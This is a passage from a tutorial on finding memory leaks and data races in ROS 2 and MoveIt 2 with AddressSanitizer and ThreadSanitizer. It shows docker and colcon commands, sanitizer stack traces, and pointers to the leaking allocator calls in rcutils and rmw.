    <span id="cb58-23"><a href="#cb58-23" aria-hidden="true" tabindex="-1"></a>    <span class="co">#4 0x5620b4cce1e7 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x821e7)</span></span>
    <span id="cb58-24"><a href="#cb58-24" aria-hidden="true" tabindex="-1"></a>    <span class="co">#5 0x5620b4c79f0f in testing::Test::Run() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x2df0f)</span></span>
    <span id="cb58-25"><a href="#cb58-25" aria-hidden="true" tabindex="-1"></a>    <span class="co">#6 0x5620b4c7b33a in testing::TestInfo::Run() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x2f33a)</span></span>
    <span id="cb58-26"><a href="#cb58-26" aria-hidden="true" tabindex="-1"></a>    <span class="co">#7 0x5620b4c7bede in testing::TestCase::Run() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x2fede)</span></span>
    <span id="cb58-27"><a href="#cb58-27" aria-hidden="true" tabindex="-1"></a>    <span class="co">#8 0x5620b4c96fef in testing::internal::UnitTestImpl::RunAllTests() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x4afef)</span></span>
    <span id="cb58-28"><a href="#cb58-28" aria-hidden="true" tabindex="-1"></a>    <span class="co">#9 0x5620b4cdefb0 in bool testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x92fb0)</span></span>
    <span id="cb58-29"><a href="#cb58-29" aria-hidden="true" tabindex="-1"></a>    <span class="co">#10 0x5620b4cd04b0 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x844b0)</span></span>
    <span id="cb58-30"><a href="#cb58-30" aria-hidden="true" tabindex="-1"></a>    <span class="co">#11 0x5620b4c93d83 in testing::UnitTest::Run() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x47d83)</span></span>
    <span id="cb58-31"><a href="#cb58-31" aria-hidden="true" tabindex="-1"></a>    <span class="co">#12 0x5620b4c672d2 in RUN_ALL_TESTS() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x1b2d2)</span></span>
    <span id="cb58-32"><a href="#cb58-32" aria-hidden="true" tabindex="-1"></a>    <span class="co">#13 0x5620b4c67218 in main (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x1b218)</span></span>
    <span id="cb58-33"><a href="#cb58-33" aria-hidden="true" tabindex="-1"></a>    <span class="co">#14 0x7fbefc09bb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)</span></span></code></pre></div>
    <p>Inspecting the dumps, there seems to be an issue in <code>test_basic</code> related to <code>FakeGuarded::FakeGuarded()</code>. In particular, this <a href="https://github.com/ros2/rcpputils/pull/9/files#diff-be1f2d1334d30376c4dec7b53eda0f55L247">line</a> wasn’t necessary and was replaced by a destructor instead.</p>
    <h4 id="processing-new-bugs">Processing new bugs</h4>
    <p>Let’s now analyze a new bug and try to reason about it. Let’s take the first the <code>sanitizer_report.csv</code> generated and from it, the first item (dumped at <a href="sanitizer_report_ros2dashing_asan.csv">sanitizer_report_ros2dashing_asan.csv</a>):</p>
    <div class="sourceCode" id="cb59"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb59-1"><a href="#cb59-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rcl,detected</span> memory leaks,__default_zero_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56,2,</span>
    <span id="cb59-2"><a href="#cb59-2" aria-hidden="true" tabindex="-1"></a> <span class="st">&quot;#0 0x7f1475ca7d38 in __interceptor_calloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xded38)</span></span>
    <span id="cb59-3"><a href="#cb59-3" aria-hidden="true" tabindex="-1"></a><span class="st">  #1 0x7f14753f34d6 in __default_zero_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56</span></span>
    <span id="cb59-4"><a href="#cb59-4" aria-hidden="true" tabindex="-1"></a><span class="st">  #2 0x7f1475405e77 in rcutils_string_array_init /opt/ros2_asan_ws/src/ros2/rcutils/src/string_array.c:54</span></span>
    <span id="cb59-5"><a href="#cb59-5" aria-hidden="true" tabindex="-1"></a><span class="st">  #3 0x7f14751e4b4a in rmw_names_and_types_init /opt/ros2_asan_ws/src/ros2/rmw/rmw/src/names_and_types.c:66</span></span>
    <span id="cb59-6"><a href="#cb59-6" aria-hidden="true" tabindex="-1"></a><span class="st">  #4 0x7f1472cda362 in rmw_fastrtps_shared_cpp::__copy_data_to_results(std::map&lt;std::__cxx11::basic_string&lt;char,</span></span>
    <span id="cb59-7"><a href="#cb59-7" aria-hidden="true" tabindex="-1"></a><span class="st">    std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt; &gt; &gt; const&amp;, rcutils_allocator_t*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:199</span></span>
    <span id="cb59-8"><a href="#cb59-8" aria-hidden="true" tabindex="-1"></a><span class="st">  #5 0x7f1472cdcc4d in rmw_fastrtps_shared_cpp::__rmw_get_topic_names_and_types_by_node(char const*, rmw_node_t const*,</span></span>
    <span id="cb59-9"><a href="#cb59-9" aria-hidden="true" tabindex="-1"></a><span class="st">    rcutils_allocator_t*, char const*, char const*, bool, std::function&lt;LockedObject&lt;TopicCache&gt; const&amp; (CustomParticipantInfo&amp;)&gt;&amp;, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:349</span></span>
    <span id="cb59-10"><a href="#cb59-10" aria-hidden="true" tabindex="-1"></a><span class="st">  #6 0x7f1472cdd0d4 in rmw_fastrtps_shared_cpp::__rmw_get_publisher_names_and_types_by_node(char const*, rmw_node_t const*,</span></span>
    <span id="cb59-11"><a href="#cb59-11" aria-hidden="true" tabindex="-1"></a><span class="st">    rcutils_allocator_t*, char const*, char const*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:385</span></span>
    <span id="cb59-12"><a href="#cb59-12" aria-hidden="true" tabindex="-1"></a><span class="st">  #7 0x7f14756a11eb in rmw_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_cpp/src/rmw_node_info_and_types.cpp:53</span></span>
    <span id="cb59-13"><a href="#cb59-13" aria-hidden="true" tabindex="-1"></a><span class="st">  #8 0x7f14759669b5 in rcl_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/graph.c:60</span></span>
    <span id="cb59-14"><a href="#cb59-14" aria-hidden="true" tabindex="-1"></a><span class="st">  #9 0x55d928637fdd in TestGraphFixture__rmw_fastrtps_cpp_test_rcl_get_publisher_names_and_types_by_node_Test::TestBody() </span></span>
    <span id="cb59-15"><a href="#cb59-15" aria-hidden="true" tabindex="-1"></a><span class="st">    /opt/ros2_asan_ws/src/ros2/rcl/rcl/test/rcl/test_graph.cpp:342</span></span>
    <span id="cb59-16"><a href="#cb59-16" aria-hidden="true" tabindex="-1"></a><span class="st">  #10 0x55d9286f0105 in void testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, </span></span>
    <span id="cb59-17"><a href="#cb59-17" aria-hidden="true" tabindex="-1"></a><span class="st">    void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447</span></span>
    <span id="cb59-18"><a href="#cb59-18" aria-hidden="true" tabindex="-1"></a><span class="st">  #11 0x55d9286e2259 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, </span></span>
    <span id="cb59-19"><a href="#cb59-19" aria-hidden="true" tabindex="-1"></a><span class="st">    void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483</span></span>
    <span id="cb59-20"><a href="#cb59-20" aria-hidden="true" tabindex="-1"></a><span class="st">  #12 0x55d92868ed41 in testing::Test::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2522</span></span>
    <span id="cb59-21"><a href="#cb59-21" aria-hidden="true" tabindex="-1"></a><span class="st">  #13 0x55d92869016c in testing::TestInfo::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2703</span></span>
    <span id="cb59-22"><a href="#cb59-22" aria-hidden="true" tabindex="-1"></a><span class="st">  #14 0x55d928690d10 in testing::TestCase::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2825</span></span>
    <span id="cb59-23"><a href="#cb59-23" aria-hidden="true" tabindex="-1"></a><span class="st">  #15 0x55d9286abe21 in testing::internal::UnitTestImpl::RunAllTests() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/</span></span>
    <span id="cb59-24"><a href="#cb59-24" aria-hidden="true" tabindex="-1"></a><span class="st">    gtest_vendor/./src/gtest.cc:5216</span></span>
    <span id="cb59-25"><a href="#cb59-25" aria-hidden="true" tabindex="-1"></a><span class="st">  #16 0x55d9286f2bb8 in bool testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, </span></span>
    <span id="cb59-26"><a href="#cb59-26" aria-hidden="true" tabindex="-1"></a><span class="st">    bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447</span></span>
    <span id="cb59-27"><a href="#cb59-27" aria-hidden="true" tabindex="-1"></a><span class="st">  #17 0x55d9286e4522 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl,</span></span>
    <span id="cb59-28"><a href="#cb59-28" aria-hidden="true" tabindex="-1"></a><span class="st">   bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483</span></span>
    <span id="cb59-29"><a href="#cb59-29" aria-hidden="true" tabindex="-1"></a><span class="st">  #18 0x55d9286a8bb5 in testing::UnitTest::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:4824</span></span>
    <span id="cb59-30"><a href="#cb59-30" aria-hidden="true" tabindex="-1"></a><span class="st">  #19 0x55d92867c104 in RUN_ALL_TESTS() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/include/gtest/gtest.h:2370</span></span>
    <span id="cb59-31"><a href="#cb59-31" aria-hidden="true" tabindex="-1"></a><span class="st">  #20 0x55d92867c04a in main /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:36</span></span>
    <span id="cb59-32"><a href="#cb59-32" aria-hidden="true" tabindex="-1"></a><span class="st">  #21 0x7f1474449b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)&quot;</span></span></code></pre></div>
    <p>When browsing through <code>ros2_asan_ws/log/latest_test</code>, we can find a similar report under rcl (in the <code>rcl/stdout_stderr.log</code> file):</p>
    <div class="sourceCode" id="cb60"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb60-1"><a href="#cb60-1" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span> Direct leak of 8 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="er">in</span> <span class="ex">1</span> object<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">allocated</span> from:</span>
    <span id="cb60-2"><a href="#cb60-2" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#0 0x7f1475ca7d38 in __interceptor_calloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xded38)</span></span>
    <span id="cb60-3"><a href="#cb60-3" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#1 0x7f14753f34d6 in __default_zero_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56</span></span>
    <span id="cb60-4"><a href="#cb60-4" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#2 0x7f1475405e77 in rcutils_string_array_init /opt/ros2_asan_ws/src/ros2/rcutils/src/string_array.c:54</span></span>
    <span id="cb60-5"><a href="#cb60-5" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#3 0x7f14751e4b4a in rmw_names_and_types_init /opt/ros2_asan_ws/src/ros2/rmw/rmw/src/names_and_types.c:66</span></span>
    <span id="cb60-6"><a href="#cb60-6" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#4 0x7f1472cda362 in rmw_fastrtps_shared_cpp::__copy_data_to_results(std::map&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt; &gt; &gt; const&amp;, rcutils_allocator_t*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:199</span></span>
    <span id="cb60-7"><a href="#cb60-7" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#5 0x7f1472cdcc4d in rmw_fastrtps_shared_cpp::__rmw_get_topic_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, std::function&lt;LockedObject&lt;TopicCache&gt; const&amp; (CustomParticipantInfo&amp;)&gt;&amp;, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:349</span></span>
    <span id="cb60-8"><a href="#cb60-8" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#6 0x7f1472cdd0d4 in rmw_fastrtps_shared_cpp::__rmw_get_publisher_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:385</span></span>
    <span id="cb60-9"><a href="#cb60-9" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#7 0x7f14756a11eb in rmw_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_cpp/src/rmw_node_info_and_types.cpp:53</span></span>
    <span id="cb60-10"><a href="#cb60-10" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#8 0x7f14759669b5 in rcl_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/graph.c:60</span></span>
    <span id="cb60-11"><a href="#cb60-11" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#9 0x55d928637fdd in TestGraphFixture__rmw_fastrtps_cpp_test_rcl_get_publisher_names_and_types_by_node_Test::TestBody() /opt/ros2_asan_ws/src/ros2/rcl/rcl/test/rcl/test_graph.cpp:342</span></span>
    <span id="cb60-12"><a href="#cb60-12" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#10 0x55d9286f0105 in void testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447</span></span>
    <span id="cb60-13"><a href="#cb60-13" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#11 0x55d9286e2259 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483</span></span>
    <span id="cb60-14"><a href="#cb60-14" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#12 0x55d92868ed41 in testing::Test::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2522</span></span>
    <span id="cb60-15"><a href="#cb60-15" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#13 0x55d92869016c in testing::TestInfo::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2703</span></span>
    <span id="cb60-16"><a href="#cb60-16" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#14 0x55d928690d10 in testing::TestCase::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2825</span></span>
    <span id="cb60-17"><a href="#cb60-17" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#15 0x55d9286abe21 in testing::internal::UnitTestImpl::RunAllTests() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:5216</span></span>
    <span id="cb60-18"><a href="#cb60-18" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#16 0x55d9286f2bb8 in bool testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447</span></span>
    <span id="cb60-19"><a href="#cb60-19" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#17 0x55d9286e4522 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483</span></span>
    <span id="cb60-20"><a href="#cb60-20" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#18 0x55d9286a8bb5 in testing::UnitTest::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:4824</span></span>
    <span id="cb60-21"><a href="#cb60-21" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#19 0x55d92867c104 in RUN_ALL_TESTS() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/include/gtest/gtest.h:2370</span></span>
    <span id="cb60-22"><a href="#cb60-22" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#20 0x55d92867c04a in main /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:36</span></span>
    <span id="cb60-23"><a href="#cb60-23" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span>     <span class="co">#21 0x7f1474449b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)</span></span></code></pre></div>
    <p>which means that the corresponding test that triggers this memory leak lives within <code>build-asan/rcl</code>. Reviewing stack and the directory, it’s fairly easy to find that <code>test_graph__rmw_fastrtps_cpp</code> is the test that triggers this error https://gist.github.com/vmayoral/44214f6290a6647e606d716d8fe2ca68.</p>
    <p>According to ASan documentation [8]:</p>
    <blockquote>
    <p>LSan also differentiates between direct and indirect leaks in its output. This gives useful information about which leaks should be prioritized, because fixing the direct leaks is likely to fix the indirect ones as well.</p>
    </blockquote>
    <p>which tells us where to focus first. Direct leaks from this first report are:</p>
    <pre><code>Direct leak of 56 byte(s) in 1 object(s) allocated from:
        #0 0x7f4eaf189d38 in __interceptor_calloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xded38)
        #1 0x7f4eae8d54d6 in __default_zero_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
        #2 0x7f4eae6c6c7e in rmw_names_and_types_init /opt/ros2_asan_ws/src/ros2/rmw/rmw/src/names_and_types.c:72
        ...</code></pre>
    <p>and</p>
    <pre><code>Direct leak of 8 byte(s) in 1 object(s) allocated from:
        #0 0x7f4eaf189d38 in __interceptor_calloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xded38)
        #1 0x7f4eae8d54d6 in __default_zero_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
        #2 0x7f4eae8e7e77 in rcutils_string_array_init /opt/ros2_asan_ws/src/ros2/rcutils/src/string_array.c:54
        ...</code></pre>
    <p>Both correspond to the <code>calloc</code> call at https://github.com/ros2/rcutils/blob/master/src/allocator.c#L56 however with different callers: - https://github.com/ros2/rcutils/blob/master/src/string_array.c#L54 (1) - https://github.com/ros2/rmw/blob/master/rmw/src/names_and_types.c#L72 (2)</p>
    <p>A complete report with all the bugs found is available at <a href="sanitizer_report_ros2dashing_asan.csv">sanitizer_report_ros2dashing_asan.csv</a>.</p>
    <p>A further discussion into this bug and an analysis with GDB is available at <a href="../tutorial3">tutorial3</a>.</p>
    <h3 id="looking-for-bugs-and-vulnerabilities-with-threadsanitizer-tsan">Looking for bugs and vulnerabilities with ThreadSanitizer (TSan)</h3>
    <p>Similar to ASan, we can use the ThreadSanitizer:</p>
    <div class="sourceCode" id="cb63"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb63-1"><a href="#cb63-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity_vulnerabilities1:latest .</span>
    <span id="cb63-2"><a href="#cb63-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-it</span> <span class="at">-v</span> /tmp/log:/opt/ros2_moveit2_ws/log basic_cybersecurity_vulnerabilities1:latest /bin/bash</span>
    <span id="cb63-3"><a href="#cb63-3" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> test <span class="at">--build-base</span><span class="op">=</span>build-tsan <span class="at">--install-base</span><span class="op">=</span>install-tsan <span class="at">--event-handlers</span> sanitizer_report+ <span class="at">--packages-up-to</span> test_communication</span></code></pre></div>
    <p>A complete report with all the bugs found is available at <a href="sanitizer_report_ros2dashing_tsan.csv">sanitizer_report_ros2dashing_tsan.csv</a>.</p>
    <h3 id="resources-2">Resources</h3>
    <ul>
    <li>[1] https://arxiv.org/pdf/1806.04355.pdf</li>
    <li>[2] https://discourse.ros.org/t/introducing-ros2-sanitizer-report-and-analysis/9287</li>
    <li>[3] https://github.com/colcon/colcon-sanitizer-reports/blob/master/README.rst</li>
    <li>[4] https://github.com/colcon/colcon-sanitizer-reports</li>
    <li>[5] https://github.com/ccache/ccache</li>
    <li>[6] https://github.com/google/sanitizers/wiki/AddressSanitizer</li>
    <li>[7] https://github.com/google/sanitizers/wiki/ThreadSanitizerCppManual</li>
    <li>[8] https://github.com/google/sanitizers/wiki/AddressSanitizerLeakSanitizerVsHeapChecker</li>
    </ul>
    <h2 id="robot-sanitizers-in-moveit-2">Robot sanitizers in MoveIt 2</h2>
    <p>In this tutorial we’ll apply the robot santizers over the the moveit2 alpha release code and review the results. This tutorial builds on top of <a href="../tutorial1/">tutorial1</a>, originally inspired by [1].</p>
    <h3 id="looking-for-bugs-and-vulnerabilities-in-moveit-2-with-addresssanitizer-asan">Looking for bugs and vulnerabilities in MoveIt 2 with AddressSanitizer (ASan)</h3>
    <p>We’ll dockerize the process to simplify reproduction of results. Let’s compile the moveit2 code with the right flags for dynamic bugs finding:</p>
    <div class="sourceCode" id="cb64"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb64-1"><a href="#cb64-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity_vulnerabilities2:latest .</span></code></pre></div>
    <p>And now, let’s jump inside of the container, launch the tests and review the results:</p>
    <div class="sourceCode" id="cb65"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb65-1"><a href="#cb65-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-it</span> <span class="at">-v</span> /tmp/log:/opt/ros2_moveit2_ws/log basic_cybersecurity_vulnerabilities2:latest /bin/bash</span>
    <span id="cb65-2"><a href="#cb65-2" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> test <span class="at">--build-base</span><span class="op">=</span>build-asan <span class="at">--install-base</span><span class="op">=</span>install-asan <span class="dt">\</span></span>
    <span id="cb65-3"><a href="#cb65-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">--event-handlers</span> sanitizer_report+ <span class="at">--merge-install</span> <span class="at">--packages-up-to</span> moveit_core</span></code></pre></div>
    <p><em>NOTE: To keep things simple I’ve restricted the packages reviewed to moveit_core and its core dependencies solely. A complete review including all moveit packages is recommended in case one wanted to catch all bugs</em>.</p>
    <p>Results are summarized in the <code>sanitizer_report.csv</code> (https://gist.github.com/vmayoral/25b3cff2c954b099eeb4d1471c1830e2). A quick look through the <code>log/</code> directory gives us an intuition into the different bugs detected:</p>
    <div class="sourceCode" id="cb66"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb66-1"><a href="#cb66-1" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> <span class="at">-R</span> <span class="st">&#39;==.*==ERROR: .*Sanitizer&#39;</span> log/latest_test <span class="kw">|</span> <span class="fu">grep</span> stdout_stderr</span>
    <span id="cb66-2"><a href="#cb66-2" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/octomap/stdout_stderr.log:1:</span> ==36465==ERROR: LeakSanitizer: detected memory leaks</span>
    <span id="cb66-3"><a href="#cb66-3" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/octomap/stdout_stderr.log:12:</span> ==36587==ERROR: LeakSanitizer: detected memory leaks</span>
    <span id="cb66-4"><a href="#cb66-4" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/octomap/stdout_stderr.log:13:</span> ==36589==ERROR: LeakSanitizer: detected memory leaks</span>
    <span id="cb66-5"><a href="#cb66-5" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/geometric_shapes/stdout_stderr.log:2:</span> ==36631==ERROR: LeakSanitizer: detected memory leaks</span>
    <span id="cb66-6"><a href="#cb66-6" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/geometric_shapes/stdout_stderr.log:3:</span> ==36634==ERROR: LeakSanitizer: detected memory leaks</span>
    <span id="cb66-7"><a href="#cb66-7" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/moveit_core/stdout_stderr.log:13:</span> ==36756==ERROR: LeakSanitizer: detected memory leaks</span></code></pre></div>
